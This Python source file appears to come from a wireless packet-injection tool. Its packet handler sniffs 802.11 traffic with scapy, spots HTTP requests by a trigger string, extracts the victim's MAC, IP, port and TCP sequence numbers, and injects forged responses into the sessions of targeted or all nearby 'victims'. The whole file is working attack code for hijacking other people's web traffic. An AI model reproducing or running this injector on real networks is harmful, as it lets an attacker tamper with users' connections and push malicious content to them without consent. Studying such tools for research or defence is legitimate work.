import socket
from lib.injector import Injector
from lib.victim import Victim
from scapy.layers.dot11 import RadioTap, Dot11, Dot11QoS
from scapy.layers.l2 import Ether, LLC, SNAP
from scapy.layers.inet import IP, TCP
from scapy.packet import Raw
from scapy.utils import wrpcap

## GLOBALS
global BLOCK_HOSTS
BLOCK_HOSTS = set()

class PacketHandler(object):
    """This class does all the heavy-lifting.

    It has an optional Victims parameter that is a
    List of instances of Victims for targeted mode.

    It can also be fed an instance of VictimParameters
    directly if working in broadcast mode and attacking all clients.
    """

    def __init__(self, *positional_parameters, **keyword_parameters):

        self.victims = keyword_parameters.get('victims')
        if self.victims is None:
            self.victims = []

        self.handler = keyword_parameters.get('handler')
        self.i = keyword_parameters.get('i')
        self.victim_parameters = keyword_parameters.get('victim_parameters')

        if self.i is None:
            print ('[ERROR] No injection interface selected')
            exit(1)

        if len(self.victims) == 0 and self.victim_parameters is None:
            print ('[ERROR] Please specify victim parameters or Victim List')
            exit(1)

        ## Argument handling
        args = keyword_parameters.get('Args')
        self.nic = args.mon
        self.single = args.single

        ## Trigger setup
        if args.trigger is None:
            self.trigger = 'GET /'
        else:
            self.trigger = args.trigger

        self.newvictims = []
        self.injector = Injector(self.i, args)


    def proc_handler(self, packet, args):
        """Process handler responsible for the last mile of packet filtering
        Obtains packet specific information and stores it to memory
        """
        if packet.haslayer(IP) and packet.haslayer(TCP):

            ## Trigger check
            request = self.requestExtractor(packet)
            if self.trigger in request:

                ## MONITOR MODE
                # if self.nic == 'mon':
                rtrmac = packet.getlayer(Dot11).addr1
                vicmac = packet.getlayer(Dot11).addr2
                dstmac = packet.getlayer(Dot11).addr3

                # ## TAP MODE
                # else:
                #     rtrmac = packet.getlayer(Ether).dst
                #     vicmac = packet.getlayer(Ether).src
                #     dstmac = 'TAP'


                vicip = packet.getlayer(IP).src
                svrip = packet.getlayer(IP).dst
                vicport = packet.getlayer(TCP).sport
                svrport = packet.getlayer(TCP).dport
                size = len(packet.getlayer(TCP).load)
                acknum = str(int(packet.getlayer(TCP).seq) + size)
                seqnum = packet.getlayer(TCP).ack
                global BLOCK_HOSTS
                # wrpcap('inbound.pcap', packet)
            else:
                return 0

            try:
                TSVal, TSecr = packet.getlayer(TCP).options[2][1]
            except:
                TSVal = None
                TSecr = None

            cookie = None
            #print (vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, TSVal, TSecr)
            return (vicmac,
                    rtrmac,
                    dstmac,
                    vicip,
                    svrip,
                    vicport,
                    svrport,
                    acknum,
                    seqnum,
                    request,
                    cookie,
                    TSVal,
                    TSecr)
        return None


    def proc_injection(self,
                       vicmac,
                       rtrmac,
                       dstmac,
                       vicip,
                       svrip,
                       vicport,
                       svrport,
                       acknum,
                       seqnum,
                       request,
                       cookie,
                       TSVal,
                       TSecr,
                       args):
        """Process injection function using the PacketHandler.victims List.

        If it was set, to check if the packet belongs to any of the targets.
        If no victims List is set, meaning it's in broadcast mode, it checks
        for the victim in PacketHandler.newvictims and gets the injection for it,
        if there is one, and injects it via Injector.inject().


        Gutting some of the logic to concentrate on injection speed
        """

        ## Broadcast mode
        if len(self.victims) == 0:

            for victim in self.newvictims:
                injection = victim.get_injection()
                self.injector.inject(vicmac,
                                    rtrmac,
                                    dstmac,
                                    vicip,
                                    svrip,
                                    vicport,
                                    svrport,
                                    acknum,
                                    seqnum,
                                    injection,
                                    TSVal,
                                    TSecr)

        ## Targeted mode
        else:
            for victim in self.victims:
                injection = victim.get_injection()
                self.injector.inject(vicmac,
                                    rtrmac,
                                    dstmac,
                                    vicip,
                                    svrip,
                                    vicport,
                                    svrport,
                                    acknum,
                                    seqnum,
                                    injection,
                                    TSVal,
                                    TSecr)

    def process(self, interface, pkt, args):
        """Process packets coming from the sniffer.

        You can override the handler with one of your own,
        that you can use for any other packet type (e.g DNS),
        otherwise it uses the default packet handler looking
        for GET requests for injection and cookies.
        """
        ## You can write your own handler for packets
        ## If wanted, do something like:
        #if self.handler is not None:
            #self.handler(interface, pkt, args)
        #else:
        try:
            vicmac,\
            rtrmac,\
            dstmac,\
            vicip,\
            svrip,\
            vicport,\
            svrport,\
            acknum,\
            seqnum,\
            request,\
            cookie,\
            TSVal,\
            TSecr = self.proc_handler(pkt, args)

            ## Broadcast mode
            if not args.t:
                v1 = Victim(ip = vicip,
                            mac = vicmac,
                            victim_parameters = self.victim_parameters)
                self.newvictims.append(v1)

            self.proc_injection(vicmac,
                                rtrmac,
                                dstmac,
                                vicip,
                                svrip,
                                vicport,
                                svrport,
                                acknum,
                                seqnum,
                                request,
                                cookie,
                                TSVal,
                                TSecr,
                                args)
        except:
            return


    def requestExtractor(self, pkt):
        """Extracts the payload for trigger processing"""
        ret2 = "\n".join(pkt.sprintf("{Raw:%Raw.load%}\n").split(r"\r\n"))
        if len(ret2.strip()) > 0:
            # return ret2.translate(None, "'").strip()
            return ret2.replace("'", '').strip()
        else:
            return None
